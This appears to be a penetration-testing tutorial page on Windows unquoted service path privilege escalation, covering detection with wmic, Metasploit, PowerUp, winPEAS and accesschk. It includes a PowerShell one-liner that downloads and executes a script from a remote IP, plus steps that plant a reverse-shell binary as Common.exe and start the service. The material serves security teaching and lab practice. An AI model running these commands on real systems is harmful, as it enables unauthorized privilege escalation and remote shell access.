# Unquoted Service Path

Executables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”). Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3… This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path: C:\Program Files\Some Dir\SomeProgram.exe

To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir SomeProgram.exe” Windows resolves this ambiguity by checking each of the possibilities in turn. **If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.**

## detecting unquoted service paths

### manual method

```
sc query vaultsvc → query the credential manager
```

searching for all unquoted service binary paths:

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

This command finds the service name, executable path, display name of the service and auto starts in all the directories except C:\Windows (since by default there is no such service which has spaces and is unquoted in this folder). Also, we need to exclude those services that are enclosed within the double quotes.

### automated with metasploit

We use Metasploit’s exploit/windows/local/trusted\_service\_path.

```
use exploit/windows/local/trusted_service_path
set session 1
exploit
```

### automated using powerup

```
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted"
```

### automated with winPEAS

Run winPEAS to check for service misconfigurations:

```
winPEASany.exe quiet servicesinfo
```

![](<../../../../.gitbook/assets/image (100).png>)

Note that the “unquotedsvc” service has an unquoted path that also contains spaces:

C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

Confirm this using sc:

```
sc qc unquotedsvc
```

![](<../../../../.gitbook/assets/image (101).png>)

we can detect it using

Use accesschk.exe to check for write and startpermissions:

```
accesschk.exe -ucqv user unquotedsvc
```

![](<../../../../.gitbook/assets/image (77).png>)

we have start permission, now check for write permission on each directory path to the binary file:

```
accesschk.exe /accepteula -uwdq C:\
accesschk.exe /accepteula -uwdq "C:\Program Files\"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

or

```
icacls c:\
icacls "c:\\Program Files"
icacls "c:\\Program Files\\Unquoted Path Service"
```

![](<../../../../.gitbook/assets/image (75).png>)

it looks like all the members of the builtin\users group have RW (read/write) access to this directory. we are a member of that group so we can create a file named Common.exe in C:\Program Files\Unquoted Path Service and have it execute a reverse shell. (because C:\Program Files\Unquoted Path Service is the first path that our user group has rw access and the next thing that windows looks for while executing the binary is the name "Common" in the "Common Filess" string so if we create a reverse shell executable named Common.exe it will be executed befor windows reaches the "Common Files" directory

Copy the reverse shell executable and rename it appropriately:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

Start a listener on Kali, and then start the service to trigger the exploit:

```
net start unquotedsvc
```

![](<../../../../.gitbook/assets/image (97).png>)
